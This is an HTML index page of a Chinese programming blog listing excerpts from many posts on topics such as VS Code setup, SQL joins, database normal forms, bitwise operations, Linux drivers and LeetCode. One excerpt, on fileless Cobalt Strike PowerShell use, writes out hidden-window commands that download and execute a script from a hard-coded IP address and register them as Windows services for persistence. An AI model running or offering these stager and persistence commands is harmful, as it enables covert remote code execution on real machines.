<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.122.0">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程中国的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程中国的博客">
		<meta property="og:title" content="编程中国的博客" />
<meta property="og:description" content="编程中国的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程中国的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程中国的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程中国的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/43e857e104d5669a5104611aecc83bd2/" rel="bookmark">
			VScode运行C&#43;&#43;语言报错
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		VScode运行C++语言报错 1.报错环境 VS Code版本：1.71.0C/C++插件版本：v1.13.0可以运行C语言代码并能能以CMD控制台显示结果但无法正常运行C++代码 2.错误显示 3.解决方法 查阅了一些人的方法，将项目总目录的.vscode的task.json文件的
"command": "D:\\download\\MinGW-w64\\mingw64\\bin\\gcc.exe",
改为
"command": "D:\\download\\MinGW-w64\\mingw64\\bin\\g++.exe",
4.最终效果 C++语言可以正常运行 注意：这种方法有弊端，当你能运行C++程序的时候不能运行C语言，如需运行C语言等切换回来。
目前还没有更好的办法，欢迎评论区讨论。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d82cb11637f6ada44bb0a0c4a913413b/" rel="bookmark">
			【Axure视频教程】中继器树形表格（折叠表格）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天教大家用中继器制作树形表格的原型模板，该模板使用简单，复用性强。再次使用时，只需要在中继器表格了填写对应内容，即可自动生成高保真的树形表格。所以强烈推荐给大家。该教程从材料准备到完成交互，手把手的教学。
【视频教程——试看版】
【Axure视频教程】中继器树形表格
【完整教程】
【Axure视频教程】中继器树形表格（折叠表格）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/60011a56733963fa5f057ef81e2c2713/" rel="bookmark">
			【SQLite】SQLite数据库的内连接INNER JOIN、左连接LEFT JOIN、右连接RIGHT JOIN和交叉连接CROSS JOIN 关键字
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.JOIN的区分 JOIN分为
INNER JOIN内连接
CROSS JOIN交叉连接
OUTER JOIN外连接，其中外连接OUTER JOIN又分为
左连接LEFT (OUTER) JOIN右连接RIGHT (OUTER) JOIN全连接FULL (OUTER) JOIN
2.基本概念 1. INNER JOIN 内连接,显示两个表中有联系的所有数据，也叫等值连接
2. LEFT JOIN 左连接，以左表为参照,显示所有数据,左表中的某行在右表中没有匹配行，则以NULL显示
3. RIGHT JOIN 右连接，显示右表所有数据，如果右表的某行在左表中没有匹配行，则将为左表返回NULL 4. FULL JOIN 全外连接，返回左表和右表中的所有行。当某行在另一个表中没有匹配行时，则另一个表的选择列表列包含空值，如果表之间有匹配行，则整个结果集行包含基表的数据值
5. CROSS JOIN 交叉连接，两个表做笛卡尔积，得到的结果集的行数是两个表的行数的乘积
3.案例 这边有两个表，我们一一来进行测试
Course表
和Mark表
1. INNER JOIN
两个表中有联系的都会被显示出来
2.LEFT JOIN
左表显示全部数据，右表和左表进行匹配，匹配不上的右表返回NULL
3.RIGHT JOIN
右连接其实就是跟左连接结果相反，因为普通的SQLite不支持右连接和全外连接，但是好像6月25日更新的SQLite 3.39.0 版本可以支持右连接和全外连接
4.CROSS JOIN
结果是两个表做笛卡尔积，那什么是笛卡尔积呢？
令A和B是任意两个集合，若序偶（带顺序的集合）的第一个成员是A的元素，第二个成员是B的元素，所有这样的序偶集合，称为集合A和B的笛卡尔乘积或直积，记做A X B
可以看到， Course表去掉表头共2行，Mark表去掉表头共4行，结果就是8行
FROM子句中使用逗号间隔连接的表也可以做到类似的效果，实际上，这两种表达式是等价的
感谢观看！！！！
以上就是全部内容，如果对您有帮助，欢迎点赞评论，或者发现有哪里写错的，欢迎指正！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bb7fa17b5d527286ac07d5c47c483004/" rel="bookmark">
			Selenium实现批量将CSDN文章改为【粉丝可见】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言Get_cookies.pyVisible_to_fans.py演示说明 前言 这几天想要整理一下自己的文章，想把之前的文章改为【粉丝可见】，但是！！！若要修改为粉丝可见，则需要手动一个一个点击文章，再一个一个点击【粉丝可见】，再一个一个点击发布文章，然后一个一个返回，重新选择下一篇文章。
整个过程既消耗时间！又消耗精力！😠
于是！！！哥们我忍不了了！花了一个多小时🕔的时间自己写了一个批量将文章改为【粉丝可见】的代码！
👉 不管是富文本编辑还是Markdown编辑的文章，统统给哥们改！
📣如果方便，点个赞，给个关注，那也是感激不尽呐！
📣话不多说，往下看吧！
Get_cookies.py Get_cookies.py 是获取登录后的cookie的程序代码
为了避免每次进入CSDN都要登录，于是我们先获取登录后的Cookie值，以后运行程序再次进入CSDN时就不用再手动登录了，可谓是“一劳永逸”！
注意：记得在10秒内登录哦！
from selenium import webdriver from time import sleep import json if __name__ == '__main__': driver = webdriver.Chrome() driver.maximize_window() driver.get('https://passport.csdn.net/login?code=public') sleep(10) dictCookies = driver.get_cookies() # 获取list的cookies jsonCookies = json.dumps(dictCookies) # 转换成字符串保存 with open('csdn_cookies.txt', 'w') as f: f.write(jsonCookies) print('cookies保存成功！') 代码运行结束后，会生成一个保存cookies的txt文件
Visible_to_fans.py Visible_to_fans.py 是批量将CSDN文章变为粉丝可见的代码
from selenium import webdriver from selenium.webdriver.common.by import By from selenium.webdriver.support.ui import WebDriverWait from selenium.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bb7fa17b5d527286ac07d5c47c483004/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3d11a0e908d09f63a423259d40b3f15c/" rel="bookmark">
			MySQL之库表设计篇：一、二、三、四、五范式、BC范式与反范式详解！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引言 MySQL的库表设计，在很多时候我们都是率性而为，往往在前期的设计中考虑并不全面，同时对于库表结构的划分也并不明确，所以很多时候在开发过程中，代码敲着敲着会去重构某张表结构，甚至大面积重构多张表结构，这种随心所欲的设计方式，无疑给开发造成了很大困扰。
但实际上设计DB库表结构时，也有一些共同需要遵守的规范，这些规范在数据库设计中被称为“范式”，理解并掌握这些设计时的规范，能让咱们在项目之初，设计的库表结构更为合理且优雅。数据库范式中，声名远扬的有三大范式，但除此之外也有一些其他设计规范，如：
①数据库三大范式（1NF、2NF、3NF）③第四范式(4NF）和第五范式：完美范式（5NF）②巴斯-科德范式（BCNF）④反范式设计 不过对于上述的几种设计范式，大部分小伙伴应该仅了解过三范式，对于其他的应该未曾接触，那在本篇中会重点阐述库表设计时，会用到的这些范式。
一、数据库三大范式 范式(Normal Form)在前面也提到过，它就是指设计数据库时要遵守的一些原则，而数据库的三大范式，相信诸位在学习数据库知识时也定然接触过。三大范式之间，它们是递进的关系，也就是后续的范式都基于前一个范式的基础上推行，就好比下面这句话：
今天我要先炒菜，然后吃饭，最后洗碗。
炒菜、吃饭、洗碗三者也属于递进关系，后者都建立在前者之上，其顺序不能颠倒，比如先吃饭再炒菜，这必然是行不通的。数据库的三大范式也一样，第二范式必须建立在第一范式的基础之上，如若设计的库表第一范式都不满足，那定然是无法满足第二范式的。
写在前面的话：其实对于数据库三范式相关的资料，网上也有很多很多，但大部分资料都涉及了太多的概念，通篇看下来也很难让人理解，因此下述的三范式则会结合具体的设计实例来让诸位彻底理解三范式。
1.1、第一范式（1NF） 库表设计时的第一范式，主要是为了确保原子性的，也就是存储的数据具备不可再分性，这话咋理解呢？上个案例：
SELECT * FROM `zz_student`; +----------------------+--------+-------+ | student | course | score | +----------------------+--------+-------+ | 竹子，男，185cm | 语文 | 95 | | 竹子，男，185cm | 数学 | 100 | | 竹子，男，185cm | 英语 | 88 | | 熊猫，女，170cm | 语文 | 99 | | 熊猫，女，170cm | 数学 | 90 | | 熊猫，女，170cm | 英语 | 95 | +----------------------+--------+-------+ 复制代码 在上述的学生表中，其中有一个student学生列，这一列存储的数据则明显不符合第一范式：原子性的规定，因为这一列的数据还可以再拆分为姓名、性别、身高三项数据，因此为了符合第一范式，应该将表结构更改为：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3d11a0e908d09f63a423259d40b3f15c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/979a867c278caf81eaeeed6a1f6ea928/" rel="bookmark">
			在visio中将图片变成黑白，将图片对象进行颜色转换 彩色图转灰度图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		标题：在visio中将图片变成黑白，将图片对象进行颜色转换 彩色图转灰度图 选中图片，右击，选中**“设置对象格式”**
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/833b3eca09d63730524b4f62a9f89384/" rel="bookmark">
			抖音全自动引流脚本详细使用教学
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大家好我是你们的小编一辞脚本，今天给大家分享新的知识，很开心可以在CSDN平台分享知识给大家,很多伙伴看不到代码我先录制一下视频 在给大家做代码，给大家分享一下抖音引流脚本的知识和视频演示 不懂的小伙伴可以认真看一下，我们一起共同学习
Swipe 124, 796, 377, 795, 1000
Delay 1000
End If
ElseIf zm.ElementFindTap("加速器") Then
TracePrint "点击加速器"
ElseIf zm.ElementFind("建议") Then
TracePrint "点返回"
Call RndTap(57, 437, 5, 5, 200, 500) //点返回 ElseIf FindColorEx(未同意, 1) Then 第一步是模拟器的下载与安装
If state Then If FindColorEx(创建角色, 0) Then Exit Function
End If
End If
If zm.ElementFind("com.jsqq.alspzf.x7sy:id/range_seek_bar") Then If zm.ElementFind("6", "com.jsqq.alspzf.x7sy:id/speed_tv") Then TracePrint "加速调整完成"
Call RndTap(340, 187, 5, 5, 200, 500) state = True
Else ElseIf FindColorEx(确认, 1) Then ElseIf zm.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/833b3eca09d63730524b4f62a9f89384/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7e7cdd65eea5ec384b0ef7200a65864a/" rel="bookmark">
			位运算（按位与 、按位或、按位异或、取反、左移右移）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		位运算 与（&amp;）0&amp;0=00&amp;1=01&amp;0=01&amp;1=1或（|）0|0=00|1=11|0=11|1=1异或（^）0^0=00^1=11^0=11^1=0 (1）按位与运算（&amp;）：双目运算符，其功能是参与运算的两数对应的二进位相与，只有对应的两个二进位均为1时，结果位才为1 ，否则为0。参与运算的数以补码方式出现.
例子
6&amp;1 = 0
6的二进制为：0110
1的二进制为：0001
0000 0110（6的补码） &amp; 0000 0001（1的补码） = 0000 0000
(2)按位或运算（|）：双目运算符，其功能是参与运算的两数对应的二进位相或，只要对应的二个二进位有一个为1时，结果位就为1。参与运算的两个数均以补码出现。
应用：常用来将源操作数某些位置0，其它位不变。
例子：
5|8 = 13
5的二进制为：0101
8的二进制为：1000
0000 0101（5的补码）| 0000 1000（8的补码） = 0000 1101 = 13
应用：常用来将源操作数某些位置1，其它位不变。
(3)按位异或运算（^）：双目运算符，其功能是参与运算的两数各对应的二进位相异或，当两对应的二进位相异时，结果为1。参与运算数仍以补码出现。
例子：
9^5=12， 00001001 (9的补码)
^
00000101 (5的补码)
=
00001100 (十进制为12)
应用：
与０相∧，保留原值；两个相同数异或，结果为0；异或操作满足结合律和交换律；将源操作数某些位翻转（1变0,0变1）；交换两个值，不用临时变量； (4)取反运算（~）：单目运算符，其功能是对参与运算的数的各二进位按位求反。
～9的运算为： ~(0000000000001001)结果为：1111111111110110 （5）左移运算符：&lt;&lt;
1.运算规则：
按二进制形式把所有的数字向左移动对应的位数，高位移出(舍弃)，低位的空位补零。
2.语法格式： 需要移位的数字 &lt;&lt; 移位的次数 例如： 3 &lt;&lt; 2，则是将数字3左移2位 计算过程： 3 &lt;&lt; 2 首先把3转换为二进制数字0000 0011，然后把该数字高位(左侧)的两个零移出，其他的数字都朝左平移2位，最后在低位(右侧)的两个空位补零。则得到的最终结果是0000 1100，则转换为十进制是12。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7e7cdd65eea5ec384b0ef7200a65864a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1c1bdb60cea8942deec571bfe2a9c6ba/" rel="bookmark">
			【Python】函数嵌套附实例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		函数嵌套 一个函数里面 又调用 了另外一个函数，这就是函数嵌套调用
定义一个函数 函数代码块以 def 关键词开头，后接函数标识符名称和圆括号 ()。
任何传入参数和自变量必须放在圆括号中间，圆括号之间可以用于定义参数。
函数的第一行语句可以选择性地使用文档字符串—用于存放函数说明。
函数内容以冒号 : 起始，并且缩进。
return [表达式] 结束函数，选择性地返回一个值给调用方，不带表达式的 return 相当于返回 None。
# 定义fun01函数 def fun01(): print('开始调用fun01') print('结束调用fun01') # 定义fun02函数，在代码块中间调用fun01 def fun02(): print('开始调用fun02') # 调用fun01 fun01() print('结束调用fun02') # 函数调用 fun02() 1.def套def
def func_001(): 2.在def调用def
3.调用进阶！（多态）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c03403e5a9463669f7e164af94adea12/" rel="bookmark">
			idea CreateProcess error=206, 文件名或扩展名太长
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CreateProcess error=206, 文件名或扩展名太长。怎么解决呢?
1,尝试第一步.
2,尝试第二步.
是的 网上有的说是上面这个，但是不行，得用下面这个
3, 尝试第三步.
jar包和modules的jar包同时导入引发的冲突相关 设置成统一的.
OK.
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a7b8b633f85d72c66edac772b132f228/" rel="bookmark">
			centos7开放端口外部访问权限
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 cat /etc/redhat-release CentOS Linux release 7.8.2003 (Core) 查看指定端口是否已开放 firewall-cmd --query-port=3690/tcp 提示 yes，表示开启；no表示未开启 添加指定需要开放的端口： firewall-cmd --add-port=3690/tcp --permanent 重载入添加的端口： firewall-cmd --reload 测试有效！ 如果提示 FirewallD is not running，那就需要修改 iptables vi /etc/sysconfig/iptables 添加 -A INPUT -p tcp -m state --state NEW -m tcp --dport 3306 -j ACCEPT 放的位置也有讲究，我们就放在 22，80，443这些端口一起就行。 service iptables restart 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/47d45d481a803e5adceafaa46a77361f/" rel="bookmark">
			Unity 瓦片地图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一些常见的使用类似方法绘制地图的游戏：
泰拉瑞亚：
如果有老哥玩过泰拉瑞亚的地图编辑器，其实unity瓦片地图和泰拉瑞亚地图编辑器手感类似
蔚蓝：
大名鼎鼎的蔚蓝也是如此
Untiy中制作2D俯视角游戏，往往需要使用瓦片地图来绘制地图 如何创建瓦片地图？ 在Hierarchy（层级）窗口下创建一个新的2D object-&gt;tilmap-&gt;Rectangular 点击Scene（场景）窗口中的九宫格图标打开Tile Palette（瓦片） 将素材图片的Texture Type（结构类型）改为sprite（精灵）并拖入Tile Palette即可完成素材的添加 如果出现无法填满一个单元格，注意将素材图片的尺寸改为图片大小 如：128*128的图片，Pixels Per Unit（像素大小）改为128 游戏素材往往为很大一张图，而实际应用中只需要使用其中的一部分，或者更大的图，如果只是单纯的不断更改一张图片素材的尺寸将会无端增加工作量，所以可以使用瓦片地图将一张图片素材切割为许多等分 如何切割图片素材？ 将图片的Sprite Mode（精灵状态）改为Multiple（多个的） 点击Sprite Editor（精灵编辑器）-&gt;slice（切片）-&gt;type(类型)为尺寸或者数量均可，完成后点击slice后点击apply即可完成素材的切割，将素材图片拖入Tile Palette即可使用 商业游戏的地图绘制又往往需要更加高效的“联想绘制”，如河边必然是泥地，天空附件必然有云。 Rule tile进阶使用 在新建的Rule tile下添加Tiling Rules，将对应位置的裁剪后的图片放入，并添加规则 中心代表此方块位置，键头代表此位置可以有其他方块，×代表不可以有其余方块，添加顺序为被裁减图片的从左到右，从上到下 快速创建类似的“有规则的”瓦片地图 创建一个新的Rule Override Tile即可实现重复一个已完成的Rule tile功能 如图，tile里放入已完成的Rule Tile，右边竖列拖入新的图片素材，并一一对应，即可快速制作一个相同规则的瓦片 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/23853cc0e05c00ad8acbe60fdf93feb3/" rel="bookmark">
			1. JAVA全栈知识体系--- Java基础
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. JAVA全栈知识体系— Java基础 文章目录 1. JAVA全栈知识体系--- Java基础1.1 语法基础面向对象特性？a = a + b 与 a += b 的区别3*0.1 == 0.3 将会返回什么? true 还是 false?能在 Switch 中使用 String 吗?对equals()和hashCode()的理解？final、finalize 和 finally 的不同之处?String、StringBuffer与StringBuilder的区别？接口与抽象类的区别？this() &amp; super()在构造方法中的区别？Java移位运算符？ 1.2 泛型为什么需要泛型？泛型类如何定义使用？泛型接口如何定义使用？泛型方法如何定义使用？泛型的上限和下限？如何理解Java中的泛型是伪泛型？ 1.3 注解注解的作用？注解的常见分类？ 1.4 异常Java异常类层次结构?可查的异常（checked exceptions）和不可查的异常（unchecked exceptions）区别？throw和throws的区别？Java 7 的 try-with-resource?异常的底层？ 1.5 反射什么是反射？反射的使用？getName、getCanonicalName与getSimpleName的区别? 1.6 SPI机制什么是SPI机制？SPI机制的应用？SPI机制的简单示例？ Java基础部分，包括语法基础，泛型，注解，异常，反射和其它（如SPI机制等）。 1.1 语法基础 面向对象特性？ 封装 利用抽象数据类型将数据和基于数据的操作封装在一起，使其构成一个不可分割的独立实体。数据被保护在抽象数据类型的内部，尽可能地隐藏内部的细节，只保留一些对外接口使之与外部发生联系。用户无需知道对象内部的细节，但可以通过对象对外提供的接口来访问该对象。
优点:
减少耦合: 可以独立地开发、测试、优化、使用、理解和修改减轻维护的负担: 可以更容易被程序员理解，并且在调试的时候可以不影响其他模块有效地调节性能: 可以通过剖析确定哪些模块影响了系统的性能提高软件的可重用性降低了构建大型系统的风险: 即使整个系统不可用，但是这些独立的模块却有可能是可用的 以下 Person 类封装 name、gender、age 等属性，外界只能通过 get() 方法获取一个 Person 对象的 name 属性和 gender 属性，而无法获取 age 属性，但是 age 属性可以供 work() 方法使用。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/23853cc0e05c00ad8acbe60fdf93feb3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/654797411692b0a1249c587e06b81d81/" rel="bookmark">
			Linux驱动（驱动程序开发、驱动框架代码编译和测试）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
什么是驱动：
设备分类：
驱动认知：
字符设备驱动工作原理
字符设备、字符设备驱动与用户空间访问该设备的程序三者之间的关系
驱动程序开发步骤
基于驱动框架的代码开发
驱动模块代码编译和测试
加载内核驱动
什么是驱动： 驱动就是对底层硬件设备的操作进行封装，并向上层提供函数接口。
设备分类： linux系统将设备分为3类：字符设备、块设备、网络设备。
字符设备：指只能一个字节一个字节读写的设备，不能随机读取设备内存中的某一数据，读取数据需要按照先后顺序。字符设备是面向流的设备，常见的字符设备有鼠标、键盘、串口、控制台和LED设备等。块设备： 指可以从设备的任意位置读取一定长度数据的设备。块设备包括硬盘、磁盘、U盘和SD卡等。网络设备： 网络设备可以是一个硬件设备,如网卡; 但也可以是一个纯粹的软件设备, 比如回环接口(lo).一个网络接口负责发送和接收数据报文。 驱动认知： 先看一张图，图中描述了流程，有助了解驱动。
用户态：
是指用户编写程序、运行程序的层面，用户态在开发时需要C的基础和C库，C库讲到文件，进程，进程间通信，线程，网络，界面（GTk）。C库（是linux标准库一定有）：就是Clibary，提供了程序支配内核干活的接口，调用的open，read，write，fork，pthread，socket由此处封装实现，由写的应用程序调用，C库中的各种API调用的是内核态，支配内核干活。 内核态：
用户要使用某个硬件设备时，需要内核态的设备驱动程序,进而驱动硬件干活，就比如之前文章里面所提到的wiringPi库，就是提供了用户操控硬件设备的接口，在没有wiringPi库时就需要自己实现wiringPi库的功能，就是自己写设备驱动程序。这样当我们拿到另一种类型的板子时，同样也可以完成开发。在linux中一切皆文件，各种的文件和设备（比如：鼠标、键盘、屏幕、flash、内存、网卡、如下图所示：）都是文件，那既然是文件了，就可以使用文件操作函数来操作这些设备。有一个问题，open、read等这些文件操作函数是如何知道打开的文件是哪一种硬件设备呢？①在open函数里面输入对应的文件名，进而操控对应的设备。②通过设备号（主设备号和次设备号）。除此之外我们还要了解这些驱动程序的位置，和如何实现这些驱动程序，每一种硬件设备对应不同的驱动（这些驱动有我们自己来实现）。Linux的设备管理是和文件系统紧密结合的，各种设备都以文件的形式存放在/dev目录下，称为设备文件。应用程序可以打开、关闭和读写这些设备文件，完成对设备的操作，就像操作普通的数据文件一样。为了管理这些设备，系统为设备编了号，每个设备号又分为主设备号和次设备号（如下图所示：）。主设备号用来区分不同种类的设备，而次设备号用来区分同一类型的多个设备。对于常用设备，Linux有约定俗成的编号，如硬盘的主设备号是3。 一个字符设备或者块设备都有一个主设备号和次设备号。主设备号和次设备号统称为设备号。主设备号用来表示一个特定的驱动程序。次设备号用来表示使用该驱动程序的各设备。例如一个嵌入式系统，有两个LED指示灯，LED灯需要独立的打开或者关闭。那么，可以写一个LED灯的字符设备驱动程序，可以将其主设备号注册成5号设备，次设备号分别为1和2。这里，次设备号就分别表示两个LED灯。 驱动链表：管理所有设备的驱动，添加或查找， 添加是发生在我们编写完驱动程序，加载到内核。查找是在调用驱动程序，由应用层用户空间去查找使用open函数。驱动插入链表的顺序由设备号检索，就是说主设备号和次设备号除了能区分不同种类的设备和不同类型的设备，还能起到将驱动程序加载到链表的某个位置，在下面介绍的驱动代码的开发无非就是添加驱动（添加设备号、设备名和设备驱动函数）和调用驱动。综上所述：如果想要打开dev下面的pin4引脚，过程是：用户态调用open（“/de/pin4”,O_RDWR）,对于内核来说，上层调用open函数会触发一个软中断（系统调用专用，中断号是0x80，0x80代表发生了一个系统调用），系统进入内核态，并走到system_call，可以认为这个就是此软中断的中断服务程序入口，然后通过传递过来的系统调用号来决定调用相应的系统调用服务程序（在这里是调用VFS中的sys_open）。sys_open会在内核的驱动链表里面根据设备名和设备号查找到相关的驱动函数（每一个驱动函数是一个节点），驱动函数里面有通过寄存器操控IO口的代码，进而可以控制IO口实现相关功能。system_call函数是怎么找到详细的系统调用服务例程的呢？ 通过系统调用号查找系统调用表sys_call_table！软中断指令INT 0x80运行时，系统调用号会被放入 eax 寄存器中，system_call函数能够读取eax寄存器获取，然后将其乘以4，生成偏移地址，然后以sys_call_table为基址。基址加上偏移地址，就能够得到详细的系统调用服务例程的地址了！然后就到了系统调用服务例程了。 补充：
每个系统调用都对应一个系统调用号，而系统调用号就对应内核中的相应处理函数。
所有系统调用都是通过中断0x80来触发的。
使用系统调用时，通过eax 寄存器将系统调用号传递到内核，系统调用的入参通过ebx、ecx……依次传递到内核
和函数一样，系统调用的返回值保存在eax中，所有要从eax中取出
字符设备驱动工作原理 字符设备驱动工作原理在linux的世界里一切皆文件，所有的硬件设备操作到应用层都会被抽象成文件的操作。我们知道如果应用层要访问硬件设备，它必定要调用到硬件对应的驱动程序。Linux内核有那么多驱动程序，应用怎么才能精确的调用到底层的驱动程序呢？
补充：
在Linux文件系统中，每个文件都用一个 struct inode结构体来描述，这个结构体记录了这个文件的所有信息，例如文件类型，访问权限等。
在linux操作系统中，每个驱动程序在应用层的/dev目录或者其他如/sys目录下都会有一个文件与之对应。
在linux操作系统中, 每个驱动程序都有一个设备号。
在linux操作系统中，每打开一次文件，Linux操作系统会在VFS层分配一个struct file结构体来描述打开的文件。
(1) 当open函数打开设备文件时，可以根据设备文件对应的struct inode结构体描述的信息，可以知道接下来要操作的设备类型（字符设备还是块设备），还会分配一个struct file结构体。
(2) 根据struct inode结构体里面记录的设备号，可以找到对应的驱动程序。这里以字符设备为例。在Linux操作系统中每个字符设备都有一个struct cdev结构体。此结构体描述了字符设备所有信息，其中最重要的一项就是字符设备的操作函数接口。
(3) 找到struct cdev结构体后，linux内核就会将struct cdev结构体所在的内存空间首地址记录在struct inode结构体i_cdev成员中，将struct cdev结构体中的记录的函数操作接口地址记录在struct file结构体的f_ops成员中。
(4) 任务完成，VFS层会给应用返回一个文件描述符（fd）。这个fd是和struct file结构体对应的。接下来上层应用程序就可以通过fd找到struct file，然后在struct file找到操作字符设备的函数接口file_operation了。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/654797411692b0a1249c587e06b81d81/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3809dc0f75572f200272513087c35375/" rel="bookmark">
			LeetCode：每日一题【第七周】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1608. 特殊数组的特征值【排序】 思路 将数组升序排序，遍历数组，如果nums[n - i] &gt;= i and nums[n - i -1] &lt; i则i满足条件。注意边界情况。
AC代码 class Solution: def specialArray(self, nums: List[int]) -&gt; int: nums = sorted(nums) n = len(nums) ans = -1 for i in range(1, 1001): if n - i &lt; 0: break if nums[n - i] &gt;= i and (n - i == 0 or nums[n - i - 1] &lt; i): ans = i break return ans 这里如果数据量大，也可用二分来找i。但是话说回来，sorted的复杂度已经nlogn了，二分优化不了最大的复杂度，即原来的复杂度是O(nlogn + n)，而优化过的复杂度是O(nlogn + logn)。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3809dc0f75572f200272513087c35375/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ccd450953aff0902e7951cb98caf9464/" rel="bookmark">
			cs powershell无文件落地利用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、写入程序
二、cs powershell添加重启上线
三、应用程序添加重启上线
web安全学习了解： web渗透测试 官网： 宣紫科技 一、写入程序 cs powershell：
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://39.108.128.1:801/a'))" 以易语言为例：
运行 (“powershell.exe -nop -w hidden -c ” ＋ #引号 ＋ “IEX ((new-object net.webclient).downloadstring('http://39.108.128.1:1231/a'))” ＋ #引号, 假, #隐藏窗口) 二、cs powershell添加重启上线 sc create "name" binpath= "cmd /c start powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://39.108.128.1:801/a'))\"" 三、应用程序添加重启上线 sc create "server power" binpath= "C:\Users\Administrator\Desktop\artifact.exe" sc description "server power" "description" 设置服务的描述字符串 sc config "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ccd450953aff0902e7951cb98caf9464/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/48b76d4044b6753416a2d60892a1a29a/" rel="bookmark">
			uniapp pages.json中配置完页面之后报错:找不到文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在pages.json中配置好了文件路径,但是返回浏览单返现报错
文件找不到,在确定路径配置正确的情况下,将新创建的文件或问文件夹删除,重新创建,重新配置,一般情况下可以解决此问题
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a646b545139ee395ed00d1f1c1be1af2/" rel="bookmark">
			ubuntu 部署 redmine
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
